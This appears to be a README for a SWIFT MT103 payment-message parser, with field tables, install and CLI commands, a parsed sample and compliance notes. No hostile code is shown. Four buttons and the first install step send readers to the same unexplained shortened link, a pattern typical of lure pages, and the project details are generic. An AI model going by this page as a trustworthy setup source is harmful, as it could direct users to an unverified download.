# ✅ MT103 Message Parser — Complete Guide

<div align="center">

![MT103](https://img.shields.io/badge/SWIFT-MT103-1D4ED8?style=for-the-badge&logo=swift&logoColor=white)
![Parser](https://img.shields.io/badge/Parser-ISO%2015022-7C3AED?style=for-the-badge&logo=json&logoColor=white)
![Banking](https://img.shields.io/badge/Banking-Financial-16A34A?style=for-the-badge&logo=bankofamerica&logoColor=white)
![Guides](https://img.shields.io/badge/Guides-93K-F59E0B?style=for-the-badge&logo=readthedocs&logoColor=black)

### 💳 Reliable Parsing & Validation of SWIFT MT103 Payment Messages

*A complete guide for fintech developers, banks, and payment integrators*

</div>


---

## 🧭 Structure Blueprint

> **🗂️ Layered documentation layout**

```
┌─────────────────────────────────────────────────────┐
│       MT103 MESSAGE PARSER — GUIDE MAP              │
├─────────────────────────────────────────────────────┤
│                                                     │
│   ◆ TIER 1 — FOUNDATIONS                            │
│     Overview · Why MT103 · Field Reference          │
│                                                     │
│   ◆ TIER 2 — ENVIRONMENT                            │
│     Requirements · Get Instructions                 │
│                                                     │
│   ◆ TIER 3 — DEPLOYMENT                             │
│     Install · Configure · First Parse               │
│                                                     │
│   ◆ TIER 4 — USAGE                                  │
│     Parse · Validate · Extract · Export             │
│                                                     │
│   ◆ TIER 5 — INTEGRATION                            │
│     API · Batch · Real-Time · Compliance            │
│                                                     │
│   ◆ TIER 6 — REFERENCE                              │
│     Fields · Codes · Troubleshooting · FAQ          │
└─────────────────────────────────────────────────────┘
```

---

## 🎯 Overview

**MT103 Message Parser** is a professional-grade library and CLI tool for parsing, validating, and enriching **SWIFT MT103** messages — the standard format used for **single customer credit transfers** across the international banking network.

It transforms raw SWIFT message blocks into structured, queryable data (JSON, XML, or in-memory objects) with full support for **field validation**, **currency handling**, **BIC/IBAN checks**, and **regulatory compliance tags**.

### 🧩 What It Handles

| Function | Description |
|----------|-------------|
| 📨 **Parse** | Block 1–5 decoding |
| ✅ **Validate** | Field rules + formats |
| 💰 **Currency** | Amount handling |
| 🏦 **BIC/IBAN** | Bank validation |
| 📅 **Date/Time** | All SWIFT formats |
| 🌐 **Multi-language** | Unicode-safe |
| 📤 **Export** | JSON, XML, CSV |
| 🔍 **Search** | Field-level queries |

---

## 💡 Why MT103?

| Reason | Benefit |
|--------|---------|
| 🌍 **Global Standard** | Used by 11,000+ banks |
| 💰 **High-Value Payments** | Cross-border transfers |
| 🔍 **Auditability** | Every field traceable |
| 📊 **Automation** | Machine-readable |
| 🏛️ **Regulatory** | AML/CFT compliance |
| 🔗 **Interoperable** | Connects to ISO 20022 |

---

## 🧬 Core Concepts

| Term | Meaning |
|------|---------|
| 🏦 **SWIFT** | Global messaging network |
| 📨 **MT103** | Single customer credit transfer |
| 🧱 **Block** | Message section (1–5) |
| 🔖 **Field Tag** | e.g., `:50K:` |
| 💱 **Currency** | ISO 4217 code |
| 🏛️ **BIC** | Bank Identifier Code |
| 📄 **IBAN** | International bank account |
| 🔒 **UETR** | Unique end-to-end reference |

---

## 🧾 MT103 Field Reference

| Tag | Field | Description |
|-----|-------|-------------|
| `:20:` | Reference | Sender's reference |
| `:23B:` | Bank Op Code | Operation type |
| `:32A:` | Value Date | Date, currency, amount |
| `:50K:` | Ordering Customer | Sender |
| `:52A:` | Ordering Institution | Sender's bank |
| `:53A:` | Sender's Correspondent | Intermediary |
| `:57A:` | Account With Institution | Receiver's bank |
| `:59:` | Beneficiary Customer | Recipient |
| `:70:` | Remittance Info | Payment details |
| `:71A:` | Charges | OUR / SHA / BEN |
| `:72:` | Sender to Receiver | Free-form info |

---

## 🖥️ System Requirements

### 🔹 Minimum

```
✅ OS: Windows 10, macOS 11+, Ubuntu 20.04+
✅ CPU: Dual-core 2.0 GHz
✅ RAM: 2 GB
✅ Storage: 100 MB
✅ Runtime: Python 3.10+ / Node.js 18+ / Java 11+
✅ No network: Fully offline capable
```

### 🔸 Recommended

```
⭐ OS: Windows 11 / macOS 13+ / Ubuntu 22.04+
⭐ CPU: Quad-core 2.5 GHz+
⭐ RAM: 8 GB
⭐ Storage: 1 GB SSD
⭐ Runtime: Python 3.11+ / Node.js 20 LTS
⭐ Database: PostgreSQL (optional)
⭐ Queue: RabbitMQ / Kafka (for streaming)
```

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-1D4ED8?style=for-the-badge&logo=swift&logoColor=white&labelColor=1E3A8A)](https://share.google/tCKVGdiD5c1oCfqwK)

</div>

---

## 📘 Get Instructions

<div align="center">

### 🚀 Access the Official Setup Guide

Click below to reach the instructions portal:

<br>

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-7C3AED?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=4C1D95)](https://share.google/tCKVGdiD5c1oCfqwK)

<br>

*Open Source • Banking-Grade • Updated 2025*

</div>

### 📚 Available Guides

| Guide | Purpose |
|-------|---------|
| 📘 **Getting Started** | Install and first parse |
| 📗 **Field Reference** | All tags explained |
| 📙 **Validation Guide** | Rule-based checks |
| 📕 **Integration Guide** | API and batch |
| 📓 **Compliance Guide** | AML/CFT notes |

---

## ⚙️ Installation Workflow

### 🪜 Stage 1 — Access the Instructions

Open the official setup guide from the button above.

### 🪜 Stage 2 — Install Runtime

**Python:**

```bash
pip install mt103-parser
```

**Node.js:**

```bash
npm install mt103-parser
```

**Java (Maven):**

```xml
<dependency>
  <groupId>com.example</groupId>
  <artifactId>mt103-parser</artifactId>
  <version>2.4.0</version>
</dependency>
```

### 🪜 Stage 3 — Verify Install

```bash
mt103 --version
```

Expected: `mt103-parser v2.x.x`

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-16A34A?style=for-the-badge&logo=swift&logoColor=white&labelColor=14532D)](https://share.google/tCKVGdiD5c1oCfqwK)

</div>

### 🪜 Stage 4 — Parse a Sample

```bash
mt103 parse sample.txt --format json
```

### 🪜 Stage 5 — Configure Validation

```yaml
validation:
  strict: true
  bic: true
  iban: true
  currency: true
  dateFormat: "YYMMDD"
  amountPrecision: 2
```

### 🪜 Stage 6 — Batch Mode

```bash
mt103 batch ./messages/*.txt --output ./parsed/
```

### 🪜 Stage 7 — Stream Mode

```bash
mt103 stream --input kafka://topic.mt103
```

### 🪜 Stage 8 — Verify

Check output JSON matches expected schema.

---

## 📄 Parsing Example

### 📥 Input — Raw MT103

```
{1:F01BANKUS33AXXX0000000000}{2:I103BANKDEFFXXXXN}
{4:
:20:REF123456
:23B:CRED
:32A:250115USD12500,00
:50K:/1234567890
JOHN DOE
123 MAIN STREET
NEW YORK, NY 10001
:52A:BANKUS33XXX
:57A:BANKDEFFXXX
:59:/9876543210
JANE SMITH
BERLIN, DE
:70:INVOICE 2025-001
:71A:SHA
-}
```

### 📤 Output — Parsed JSON

```json
{
  "block1": {
    "applicationId": "F",
    "serviceId": "01",
    "senderBIC": "BANKUS33XXX",
    "sessionNumber": "0000",
    "sequenceNumber": "000000"
  },
  "block2": {
    "messageType": "103",
    "receiverBIC": "BANKDEFFXXX",
    "priority": "N"
  },
  "block4": {
    "20": "REF123456",
    "23B": "CRED",
    "32A": {
      "date": "2025-01-15",
      "currency": "USD",
      "amount": 12500.00
    },
    "50K": {
      "account": "1234567890",
      "name": "JOHN DOE",
      "address": ["123 MAIN STREET", "NEW YORK, NY 10001"]
    },
    "52A": "BANKUS33XXX",
    "57A": "BANKDEFFXXX",
    "59": {
      "account": "9876543210",
      "name": "JANE SMITH",
      "address": ["BERLIN, DE"]
    },
    "70": "INVOICE 2025-001",
    "71A": "SHA"
  },
  "validation": {
    "status": "valid",
    "warnings": [],
    "errors": []
  }
}
```

---

## ✅ Validation Rules

### 🔍 Built-In Checks

| Check | Description |
|-------|-------------|
| 🔢 **Field format** | Tag structure |
| 💱 **Currency** | ISO 4217 |
| 🏦 **BIC** | 8 or 11 chars |
| 📄 **IBAN** | Mod-97 checksum |
| 📅 **Date** | Valid YYMMDD |
| 💰 **Amount** | Precision |
| 🔒 **UETR** | UUID v4 |
| 🔠 **Charset** | SWIFT allowed |

### 🧪 Custom Rules

```yaml
customRules:
  - name: "HighValueAlert"
    condition: "amount > 1000000"
    action: "warn"
  
  - name: "SanctionedCountry"
    condition: "beneficiary.country IN ['XX', 'YY']"
    action: "block"
```

---

## 📤 Export Formats

| Format | Use Case |
|--------|----------|
| 📄 **JSON** | API, storage |
| 📊 **CSV** | Reporting |
| 🗂️ **XML** | Legacy systems |
| 📘 **ISO 20022** | Modern conversion |
| 📄 **Markdown** | Documentation |

### 📘 ISO 20022 Conversion

```bash
mt103 convert sample.txt --to pain.001 --output payment.xml
```

---

## 🚀 Advanced Features

### 🌐 Real-Time Streaming

```bash
mt103 stream --input kafka://mt103-topic \
  --validate strict \
  --output postgres://db/payments
```

### 📊 Database Integration

```python
from mt103_parser import Parser
from sqlalchemy import create_engine

parser = Parser()
engine = create_engine("postgresql://user:pass@localhost/payments")

with open("sample.txt") as f:
    message = parser.parse(f.read())
    message.to_sql(engine, "mt103_messages")
```

### 🔔 Webhook Notifications

```yaml
webhooks:
  - event: "message.parsed"
    url: "https://api.example.com/hooks/mt103"
  - event: "validation.failed"
    url: "https://api.example.com/hooks/errors"
```

---

## 🧪 Verification

| Check | Command | Expected |
|-------|---------|----------|
| ✅ Install | `mt103 --version` | Version shown |
| ✅ Parse works | `mt103 parse` | JSON output |
| ✅ Validation | `mt103 validate` | Status clean |
| ✅ BIC check | Test message | Valid/invalid |
| ✅ IBAN check | Test message | Mod-97 pass |
| ✅ Batch works | `mt103 batch` | All parsed |
| ✅ Stream works | Kafka test | Messages flow |
| ✅ Export works | `mt103 convert` | File created |

---

## 🩺 Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| 🚫 Parse error | Malformed input | Check block tags |
| 🚫 Unknown field | Non-standard tag | Add to config |
| 🚫 Date invalid | Wrong format | YYMMDD required |
| 🚫 BIC length | Wrong length | 8 or 11 chars |
| 🚫 IBAN fails | Checksum | Verify digits |
| 🚫 Amount parse | Comma decimal | Set locale |
| 🚫 Encoding | Legacy charset | UTF-8 with BOM |
| 🚫 Stream drops | Kafka offset | Reset consumer |
| 🚫 Export mismatch | Schema version | Update mapping |
| 🚫 Slow batch | Sequential | Use `--parallel 8` |

### 🔄 Reset Config

```bash
mt103 config --reset
```

---

## 🧰 CLI Reference

| Command | Purpose |
|---------|---------|
| `mt103 parse <file>` | Parse single file |
| `mt103 batch <glob>` | Batch process |
| `mt103 validate <file>` | Validate only |
| `mt103 convert` | Convert format |
| `mt103 stream` | Stream mode |
| `mt103 fields` | List all fields |
| `mt103 currencies` | List currencies |
| `mt103 config` | Manage config |
| `mt103 --version` | Show version |
| `mt103 --help` | Show help |

---

## 🔌 API Reference

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/parse` | POST | Parse message |
| `/api/validate` | POST | Validate |
| `/api/convert` | POST | Format convert |
| `/api/fields` | GET | Field list |
| `/api/currencies` | GET | Currencies |
| `/api/health` | GET | Status check |

### 🧾 Sample Request

```bash
curl -X POST http://localhost:8080/api/parse \
  -H "Content-Type: text/plain" \
  --data-binary @sample.txt
```

---

## 🏛️ Compliance Notes

| Area | Guidance |
|------|----------|
| 📜 **AML** | Screen beneficiaries |
| 🚫 **Sanctions** | OFAC/EU lists |
| 📊 **Reporting** | Log all messages |
| 🔐 **Data Privacy** | Encrypt at rest |
| 🕵️ **Audit Trail** | Immutable logs |
| 🌍 **Cross-Border** | Local regulations |

> **⚠️ Disclaimer:** This tool parses messages — it does **not** perform AML/KYC decisions. Always integrate with proper compliance systems.

---

## 📚 Resources

| Resource | Purpose |
|----------|---------|
| 📖 **SWIFT Standards** | Official docs |
| 📗 **ISO 20022** | Modern standard |
| 💬 **Community** | Developer help |
| 🎥 **Tutorials** | Video guides |
| 📊 **Field Reference** | Complete tag list |

---

## 💬 FAQ

**What is MT103?**
The standard SWIFT message for single customer credit transfers.

**Is it free?**
Yes — MIT-licensed and open source.

**Does it work offline?**
Yes — no internet needed for parsing.

**Does it support ISO 20022?**
Yes — via conversion commands.

**Can I validate BIC and IBAN?**
Yes — built-in checks.

**Does it store messages?**
Only if you enable persistence.

**Is it compliant with PSD2?**
It supports compliance workflows, but you must add KYC logic.

**Can I use it in production?**
Yes — used by banks and fintechs.

**Does it support Arabic/Chinese?**
Yes — Unicode-safe.

**Is there a Docker version?**
Yes — official image available.

---

## 📅 Version History

| Version | Date | Highlights |
|---------|------|-----------|
| **2.4.0** | Jan 2025 | ISO 20022 export |
| 2.2.0 | Oct 2024 | Stream mode |
| 2.0.0 | Jun 2024 | Full validation engine |
| 1.5.0 | Feb 2024 | Initial release |

---

<div align="center">

### 🌟 Found This Guide Helpful?

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-F59E0B?style=for-the-badge&logo=swift&logoColor=black&labelColor=92400E)](https://share.google/tCKVGdiD5c1oCfqwK)

**⭐ Star this repository if it helped! ⭐**

*Made with 💜 for the fintech community*

</div>
